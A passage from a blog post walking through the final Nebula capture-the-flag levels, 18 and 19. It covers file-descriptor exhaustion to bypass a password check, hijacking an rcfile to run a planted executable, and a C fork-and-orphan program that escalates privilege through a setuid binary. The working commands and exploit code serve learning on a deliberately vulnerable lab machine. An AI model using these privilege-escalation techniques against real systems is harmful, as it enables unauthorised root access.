<span class="go">/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0x5cb113]</span>
<span class="go">./flag18[0x8048bb1]</span>
<span class="go">======= Memory map: ========</span>
<span class="go">005b2000-00728000 r-xp 00000000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so</span>
<span class="go">00728000-0072a000 r--p 00176000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so</span>
<span class="go">0072a000-0072b000 rw-p 00178000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so</span>
<span class="go">0072b000-0072e000 rw-p 00000000 00:00 0</span>
<span class="go">0079b000-007b9000 r-xp 00000000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so</span>
<span class="go">007b9000-007ba000 r--p 0001d000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so</span>
<span class="go">007ba000-007bb000 rw-p 0001e000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so</span>
<span class="go">007fd000-007fe000 r-xp 00000000 00:00 0          [vdso]</span>
<span class="go">00886000-008a2000 r-xp 00000000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1</span>
<span class="go">008a2000-008a3000 r--p 0001b000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1</span>
<span class="go">008a3000-008a4000 rw-p 0001c000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1</span>
<span class="go">08048000-0804a000 r-xp 00000000 07:00 12922      /home/flag18/flag18</span>
<span class="go">0804a000-0804b000 r--p 00001000 07:00 12922      /home/flag18/flag18</span>
<span class="go">0804b000-0804c000 rw-p 00002000 07:00 12922      /home/flag18/flag18</span>
<span class="go">099f9000-09a1a000 rw-p 00000000 00:00 0          [heap]</span>
<span class="go">b7832000-b7833000 rw-p 00000000 00:00 0</span>
<span class="go">b783b000-b783e000 rw-p 00000000 00:00 0</span>
<span class="go">bf8bf000-bf8e0000 rw-p 00000000 00:00 0          [stack]</span>
<span class="go">Aborted</span>
</code></pre></div>
</p>

<p>This led me to learn about <a href="https://en.wikipedia.org/wiki/Stack_canary#Stack_canaries">stack canaries</a>, and with this we&rsquo;re out of luck
(for a simple solution). This means the code has been compiled with
<em>FORTIFY_SOURCE</em> and this also going to prevent string formatting exploits in
the <code>notsupported</code> function.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level18@nebula:/home/flag18$</span> ./flag18 -v -v -v -d /tmp/flag18/debug
<span class="go">site exec %n</span>
<span class="go">*** %n in writable segment detected ***</span>
<span class="go">Aborted</span>
</code></pre></div>
</p>

<p>Yup. In the process of researching this I also discovered a neat tool called
<a href="http://trapkit.de/tools/checksec.html">checksec.sh</a> that can help identify these compiler options early on.</p>

<p>So what have we got left? The function that checks the password file. If it&rsquo;s
not actually able to find the password file, it will log us in. Unfortunately
we&rsquo;re not able to delete it. However we can make the <code>fopen</code> call fail another
way. This error has happened a lot at work where we often deal with a lot of
files being open on a single system. Linux systems have a limit as to how
many filedescriptors it can have open at any one time. Because
the tool doesn&rsquo;t close the file descriptors until you call <code>closelog</code>,
we can just keep opening files until we hit the limit. Let&rsquo;s see what that
limit is.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level18@nebula:/home/flag18$</span> <span class="nb">ulimit</span> -a
<span class="go">core file size          (blocks, -c) 0</span>
<span class="go">data seg size           (kbytes, -d) unlimited</span>
<span class="go">scheduling priority             (-e) 0</span>
<span class="go">file size               (blocks, -f) unlimited</span>
<span class="go">pending signals                 (-i) 1817</span>
<span class="go">max locked memory       (kbytes, -l) 64</span>
<span class="go">max memory size         (kbytes, -m) unlimited</span>
<span class="go">open files                      (-n) 1024</span>
<span class="go">pipe size            (512 bytes, -p) 8</span>
<span class="go">POSIX message queues     (bytes, -q) 819200</span>
<span class="go">real-time priority              (-r) 0</span>
<span class="go">stack size              (kbytes, -s) 8192</span>
<span class="go">cpu time               (seconds, -t) unlimited</span>
<span class="go">max user processes              (-u) 1817</span>
<span class="go">virtual memory          (kbytes, -v) unlimited</span>
<span class="go">file locks                      (-x) unlimited</span>
</code></pre></div>
</p>

<p><em>1024</em> is the limit. So let&rsquo;s open 1024 files and see what happens. As we have
a few file descriptors open already we just need to open 1021 more.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level18@nebula:/home/flag18$</span> python -c <span class="s2">&quot;print(&#39;login me\n&#39;*1021 + &#39;shell&#39;)&quot;</span> <span class="p">|</span> ./flag18 -v -d /tmp/flag18/debug
<span class="go">./flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24</span>
</code></pre></div>
</p>

<p>Ah, so many file descriptors we can&rsquo;t open any more, not even to shared libraries.
We can close one and see how that goes.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level18@nebula:/home/flag18$</span> python -c <span class="s2">&quot;print(&#39;login me\n&#39;*1021 + &#39;closelog\n&#39; + &#39;shell&#39;)&quot;</span> <span class="p">|</span> ./flag18 -v -d /tmp/flag18/debug
<span class="go">./flag18: -d: invalid option</span>
<span class="go">Usage:	./flag18 [GNU long option] [option] ...</span>
<span class="go">	./flag18 [GNU long option] [option] script-file ...</span>
<span class="go">GNU long options:</span>
<span class="go">	--debug</span>
<span class="go">	--debugger</span>
<span class="go">	--dump-po-strings</span>
<span class="go">	--dump-strings</span>
<span class="go">	--help</span>
<span class="go">	--init-file</span>
<span class="go">	--login</span>
<span class="go">	--noediting</span>
<span class="go">	--noprofile</span>
<span class="go">	--norc</span>
<span class="go">	--posix</span>
<span class="go">	--protected</span>
<span class="go">	--rcfile</span>
<span class="go">	--restricted</span>
<span class="go">	--verbose</span>
<span class="go">	--version</span>
<span class="go">Shell options:</span>
<span class="go">	-irsD or -c command or -O shopt_option		(invocation only)</span>
<span class="go">	-abefhkmnptuvxBCHP or -o option</span>
</code></pre></div>
</p>

<p>Right, so we need to remember that we&rsquo;re running <code>sh</code> here, and our arguments
are being passed to it. Unfortunately <code>-d</code> and such are not valid here.
Time to read the manual&hellip;.</p>

<blockquote>
<p><strong>&ndash;rcfile file</strong></p>

<p>Execute commands from file instead of the system wide
initialization file /etc/bash.bashrc and the standard personal
initialization file ~/.bashrc if the shell is interactive
(see INVOCATION below).</p>
</blockquote>

<p>Ok, well, it&rsquo;s worth a shot.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level18@nebula:/home/flag18$</span> python -c <span class="s2">&quot;print(&#39;login me\n&#39;*1021 + &#39;closelog\n&#39; + &#39;shell&#39;)&quot;</span> <span class="p">|</span> ./flag18 --rcfile -d /tmp/flag18/debug
<span class="go">./flag18: invalid option -- &#39;-&#39;</span>
<span class="go">./flag18: invalid option -- &#39;r&#39;</span>
<span class="go">./flag18: invalid option -- &#39;c&#39;</span>
<span class="go">./flag18: invalid option -- &#39;f&#39;</span>
<span class="go">./flag18: invalid option -- &#39;i&#39;</span>
<span class="go">./flag18: invalid option -- &#39;l&#39;</span>
<span class="go">./flag18: invalid option -- &#39;e&#39;</span>
<span class="go">/tmp/flag18/debug: line 1: Starting: command not found</span>
<span class="go">/tmp/flag18/debug: line 2: syntax error near unexpected token `(&#39;</span>
<span class="go">/tmp/flag18/debug: line 2: `logged in successfully (without password file)&#39;</span>
</code></pre></div>
</p>

<p>Heavens, it worked - sort of. Notice the <em>/tmp/flag18/debug: line 1: Starting: command not found</em>? That&rsquo;s because our <em>rcfile</em> is set to be our debug file. So
it writes to the debug file and then the shell will try to execute it. As we know
the first line in the file is <em>Starting up. Verbose level = 1</em>, so all we really
need to do to quash that error we need to create an executable with that name.
Inside that we will run out beloved <code>getflag</code></p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level18@nebula:/home/flag18$</span> <span class="nb">echo </span>getflag &gt; /tmp/Starting
<span class="gp">level18@nebula:/home/flag18$</span> chmod +x !<span class="err">$</span>
<span class="go">chmod +x /tmp/Starting</span>
<span class="gp">level18@nebula:/home/flag18$</span> <span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="si">${</span><span class="nv">PATH</span><span class="si">}</span>:/tmp
<span class="gp">level18@nebula:/home/flag18$</span> python -c <span class="s2">&quot;print(&#39;login me\n&#39;*1021 + &#39;closelog\n&#39; + &#39;shell&#39;)&quot;</span> <span class="p">|</span> ./flag18 --rcfile -d /tmp/flag18/debug
<span class="go">./flag18: invalid option -- &#39;-&#39;</span>
<span class="go">./flag18: invalid option -- &#39;r&#39;</span>
<span class="go">./flag18: invalid option -- &#39;c&#39;</span>
<span class="go">./flag18: invalid option -- &#39;f&#39;</span>
<span class="go">./flag18: invalid option -- &#39;i&#39;</span>
<span class="go">./flag18: invalid option -- &#39;l&#39;</span>
<span class="go">./flag18: invalid option -- &#39;e&#39;</span>
<span class="go">You have successfully executed getflag on a target account</span>
<span class="go">/tmp/flag18/debug: line 2: syntax error near unexpected token `(&#39;</span>
<span class="go">/tmp/flag18/debug: line 2: `logged in successfully (without password file)&#39;</span>
</code></pre></div>
</p>

<p>The harder ways are beyond what I can do, but for those interested in
circumventing <code>FORTIFY_SOURCE</code> you can read <a href="http://phrack.org/issues/67/9.html">A Eulogy for Formatting Strings</a>. I&rsquo;ll be re-reading that for sure.</p>

<h2 id="flag-19:eaf9fabfe6e85567a2c1f06adf83e2d8">Flag 19</h2>

<blockquote>
<p>There is a flaw in the below program in how it operates.</p>
</blockquote>

<p><div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;stdlib.h&gt;</span>
<span class="cp">#include &lt;unistd.h&gt;</span>
<span class="cp">#include &lt;string.h&gt;</span>
<span class="cp">#include &lt;sys/types.h&gt;</span>
<span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &lt;fcntl.h&gt;</span>
<span class="cp">#include &lt;sys/stat.h&gt;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">pid_t</span> <span class="n">pid</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
  <span class="k">struct</span> <span class="n">stat</span> <span class="n">statbuf</span><span class="p">;</span>

  <span class="cm">/* Get the parent&#39;s /proc entry, so we can verify its user id */</span>

  <span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;/proc/%d&quot;</span><span class="p">,</span> <span class="n">getppid</span><span class="p">());</span>

  <span class="cm">/* stat() it */</span>

  <span class="k">if</span><span class="p">(</span><span class="n">stat</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">statbuf</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to check parent process</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="cm">/* check the owner id */</span>

  <span class="k">if</span><span class="p">(</span><span class="n">statbuf</span><span class="p">.</span><span class="n">st_uid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* If root started us, it is ok to start the shell */</span>

    <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
    <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Unable to execve&quot;</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You are unauthorized to run this program</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
</p>

<p>So we can get the shell we want if we can run this as root. How can we do that?
This exploits involves a knowledge of Linux forks. Basically if a process
forks and the parent dies, the child will automatically be run under <code>init</code>.
This is called <a href="http://wiki.linuxquestions.org/wiki/Fork_off_and_die">Fork off and die</a>. So who does <code>init</code> run as?</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level19@nebula:/tmp/flag19$</span> ps aux <span class="p">|</span> grep init
<span class="go">root         1  0.0  0.6   3196  1512 ?        Ss   00:32   0:00 /sbin/init</span>
</code></pre></div>
</p>

<p>In order to make use of this we need to run <code>flag18</code> as a forked process and
then kill the parent. The arguments to <code>flag18</code> are passed onto the shell
it executes, and thus we can make use of this. I&rsquo;ll write some C code
to fork the <code>flag18</code> process to which we will pass the <code>getflag</code>. It should
work.</p>

<p><div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;unistd.h&gt;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">childPID</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span><span class="n">childPID</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// forked</span>
        <span class="k">if</span><span class="p">(</span><span class="n">childPID</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// child</span>
            <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
            <span class="n">setresuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span><span class="n">geteuid</span><span class="p">(),</span><span class="n">geteuid</span><span class="p">());</span>
            <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="s">&quot;-c&quot;</span><span class="p">,</span> <span class="s">&quot;/bin/getflag&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
            <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/home/flag19/flag19&quot;</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
</p>

<p>Get the idea? Right, let&rsquo;s taste this pudding</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">level19@nebula:/tmp/flag19$</span> gcc forkit.c -o forkit
<span class="gp">level19@nebula:/tmp/flag19$</span> ./forkit
<span class="gp">level19@nebula:/tmp/flag19$</span> You have successfully executed getflag on a target account
</code></pre></div>
</p>

<p><strong>Nebula done.</strong></p>

<h2 id="closing-words:eaf9fabfe6e85567a2c1f06adf83e2d8">Closing words</h2>

<p>Firstly: Thanks for taking the time to read this. Please leave any feedback or
comments below (or twitter/email if you prefer).</p>

<p>Secondly: If you are here because you are also playing <em>Nebula</em> and are
new to this like I am, this write up might seem like magic.
You&rsquo;re struggling to figure out how to get past a certain
level and then this text makes it seem like magic.</p>

<p>It&rsquo;s not like that. I spent a lot of time working through the later levels as I
quickly learned how little I knew. Much time was spent researching and learning
about things I thought I already knew. Turns out I knew very little about them.
There were a lot of failures on the way, but if I kept those in, this post
would be much much longer. The thought process seems very simple in write ups,
but trust me, there&rsquo;s quite a bit of puzzling and thinking to do.</p>

<p>It&rsquo;s early days for me too, and I very much enjoyed <em>Nebula</em>, and have a whole
new set of tools and ideas in my arsenal for the next challenge.</p>

      </article>

      <p class="post-meta">Tags:&nbsp;
        
            
            <a href="http://unlogic.co.uk//tags/ctf">ctf</a>
        
            ,&nbsp;
            <a href="http://unlogic.co.uk//tags/hacking">hacking</a>
        
            ,&nbsp;
            <a href="http://unlogic.co.uk//tags/exploits">exploits</a>
        
      </p>

      
<div id="disqus_thread">
  <script type="text/javascript">
     var disqus_shortname = "unlogic";
     var disqus_identifier = "\/2014\/07\/02\/cracking-nebula-part2\/";

     (function() {
       var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
       dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
       (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
     })();
  </script>
</div>


    </div>
  </div>
</div>
    <footer class="footer">
      <div class="p2 wrap">
        <div class="measure mt1 center">
      <nav class="social-icons icons">
<a class="fa fa-rss rss" href="http://unlogic.co.uk/index.xml"></a>

<a class="fa fa-twitter twitter" href="https://twitter.com/binaryheadache"></a>

</nav>

          <small>
            Copyright &#169; 2015<br>
            Powered by <a href="http://gohugo.io/" target="_blank">Hugo</a> &amp; <a href="https://github.com/azmelanar/hugo-theme-pixyll" target="_blank">Pixyll</a>
          </small>
        </div>
      </div>
    </footer>

    
    <script src="http://unlogic.co.uk/js/highlight.pack.js"></script>
    <script>hljs.initHighlightingOnLoad();</script>

    
    


</body>
</html>

